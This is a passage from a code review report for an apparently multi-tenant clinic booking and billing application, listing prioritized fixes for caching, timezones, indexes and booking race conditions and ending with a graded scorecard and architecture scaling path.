| R5 | **Add audit logging to payment flows** — healthcare billing compliance | 0.5 day | `src/app/api/payments/*/route.ts` |

### Priority 2: Fix Before 100+ Active Clinics

| # | Recommendation | Effort | Files Affected |
|---|---------------|--------|----------------|
| R6 | **Implement caching for clinic branding/services** — reduce Supabase load | 2 days | New `src/lib/cache.ts`, update `public.ts` |
| R7 | **Cache clinic-by-subdomain in middleware** — reduce latency per request | 1 day | `src/middleware.ts`, new KV binding |
| R8 | **Fix timezone handling** — use clinic's timezone for all date/time operations | 2 days | `src/app/api/cron/reminders/route.ts`, booking routes |
| R9 | **Add composite indexes** for common query patterns (clinic+date+status, clinic+role) | 0.5 day | New migration |
| R10 | **Paginate reminder cron** — remove 500 row limit, use cursor pagination | 1 day | `src/app/api/cron/reminders/route.ts` |

### Priority 3: Tech Debt to Address Continuously

| # | Recommendation | Effort | Files Affected |
|---|---------------|--------|----------------|
| R11 | **Split `server.ts` into domain modules** | 2 days | `src/lib/data/server.ts` → multiple files |
| R12 | **Use Supabase generated types instead of manual casting** in `public.ts` | 1 day | `src/lib/data/public.ts` |
| R13 | **Consolidate time columns** — deprecate either `slot_start/end` or `appointment_date/start_time` | 1 day | Schema migration + application code |
| R14 | **Add soft deletes** for healthcare compliance | 2 days | Schema migration + query filters |
| R15 | **Implement proper DB-level booking slot enforcement** — replace TOCTOU race with advisory locks or unique partial index | 1 day | New migration + `src/app/api/booking/route.ts` |
| R16 | **Remove dev bypass in booking token verification** or gate it behind a separate env var | 0.5 hr | `src/app/api/booking/route.ts:49` |

### Architecture Evolution Path

For scaling to 10,000+ clinics:

1. **Phase 1 (Now):** Fix CRITICAL-03 — make `public.ts` tenant-aware from request context
2. **Phase 2 (100 clinics):** Add Cloudflare KV caching, composite indexes, DB aggregation functions
3. **Phase 3 (1,000 clinics):** Single deployment serving all clinics via subdomain routing, Supabase connection pooling, background job queue (Cloudflare Queues)
4. **Phase 4 (10,000 clinics):** Consider Supabase schema-per-tenant or dedicated Supabase projects per region, read replicas, materialized views for dashboard stats

---

## Summary Scorecard

| Area | Grade | Notes |
|------|-------|-------|
| **Security** | B+ | Critical vulns were found and fixed (00028). Good CSRF, rate limiting, webhook verification. Needs audit logging in payment flows. |
| **Architecture** | C+ | Clean request flow and good separation of concerns, but static `clinicConfig` is a scaling dead-end. Three clinic_id sources is a design smell. |
| **Database** | B | Comprehensive schema with good indexes (00024). RLS policies are thorough. Missing composite indexes, no views, redundant time columns. |
| **Code Quality** | C+ | Good validation layer (Zod), good crypto utilities. But 1200-line monolith data file, unsafe type casts, inconsistent error handling. |
| **Performance** | C | No caching anywhere. Client-side aggregation of large datasets. 4 DB round-trips in middleware. |
| **Multi-Tenancy** | C | RLS provides solid data isolation. But public data layer is hardcoded to one tenant. Can't serve multiple clinics from one build. |
| **Scalability** | C | Works fine for <100 clinics. Breaks at 1,000+ due to deployment model. Several O(n) query patterns. |
| **Edge Cases** | B- | Good idempotency in cron jobs, good race condition awareness in booking. Timezone blindness is the biggest gap. |

**Overall:** The codebase shows strong security awareness (crypto utilities, CSRF, rate limiting, RLS) and demonstrates iterative improvement (migration 00028 fixing real vulnerabilities). The main risks are the scalability ceiling from the static `clinicConfig` architecture and the lack of caching/aggregation for dashboard queries. For a pre-launch or early-stage SaaS, addressing the Priority 1 items would put this on solid footing.
